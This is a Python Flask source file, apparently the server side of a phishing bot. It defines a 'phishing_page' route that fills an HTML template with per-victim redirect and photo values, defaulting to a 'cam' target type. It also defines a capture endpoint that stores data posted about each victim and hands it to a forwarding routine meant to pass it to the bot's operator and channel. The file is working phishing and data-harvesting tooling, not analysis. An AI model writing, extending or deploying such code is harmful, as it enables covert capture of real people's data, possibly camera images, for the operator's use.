from flask import Flask, request, jsonify
import time
import threading
from bot.config import BASE_URL
from bot.utils.storage import victim_data_store, link_cache

app = Flask(__name__)

@app.route('/p/<uid>')
def phishing_page(uid):
    victim_id = request.args.get('v', 'unknown')
    target_type = request.args.get('type', 'cam')
    
    redirect_url = victim_data_store.get(f"redirect_{victim_id}", 'https://google.com')
    photo_url = victim_data_store.get(f"photo_{victim_id}", 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    html = html.replace('{{PHOTO_URL}}', photo_url)
    return html

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    victim_data_store[f"victim_{victim_id}"] = data
    threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return "✅ Bot is running!"

def forward_to_user_and_channel(victim_id, data):
    # This will be handled by bot's __init__
    print(f"📥 Data from {victim_id}")
